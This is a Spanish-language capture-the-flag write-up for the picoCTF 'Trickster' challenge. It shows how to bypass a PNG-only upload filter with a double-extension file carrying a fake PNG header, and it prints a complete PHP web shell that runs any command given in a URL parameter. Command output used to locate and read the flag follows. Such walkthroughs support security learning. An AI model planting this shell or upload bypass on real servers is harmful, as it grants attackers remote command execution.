## Objetivo
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:57013/)!
## Solución

```
En este reto tenemos una pagina web, donde podremos subir archivos png en ella, indagando un poco en la pagina nos encontramos un robots.txt
```

![Trickster](/imagenes/Trickster(1).png)

```
Checamos el instructions.txt:
```

![Trickster 2](/imagenes/Trickster(2).png)

```
Creamoss un archivo ccon doble extension, en mi caso imagen.png.php con el contenido de una webShell:
.PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

```
Subimos el archivo:
```

![Trickster 3](/imagenes/Trickster(3).png)

```
Y para ejecutar la webshell entramos a la ruta /uploads/imagen.png.php


pero agregamos /uploads/imagen.png.php?cmd=ls para ver si funciono la webshell:
```

![Trickster 4](/imagenes/Trickster(4).png)

```
En mi caso me desplego esto donde puedo ejecutar comandos.

Cheamos lo basico al entrar en un servidor:

un PWD para ver donde nos encontramos:
/var/www/html/uploads

un ls -la ../ para ver el direcctorio anterior:
total 16
drwxrwxrwt 1 www-data www-data   21 Mar 12  2024 .
drwxr-xr-x 1 root     root       18 Nov 21  2023 ..
-rw-r--r-- 1 root     root       49 Mar 12  2024 GAZWIMLEGU2DQ.txt
-rw-r--r-- 1 root     root     1572 Feb  7  2024 index.php
-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt
drwxr-xr-x 1 www-data root       28 Oct  2 03:26 uploads

vemos un archivo raro asi que lo abrimoss:

cat ../GAZWIMLEGU2DQ.txt

y obtenemos la flag
```

![Trickster 5](/imagenes/Trickster(5).png)

## Notas adicionales
## Referencias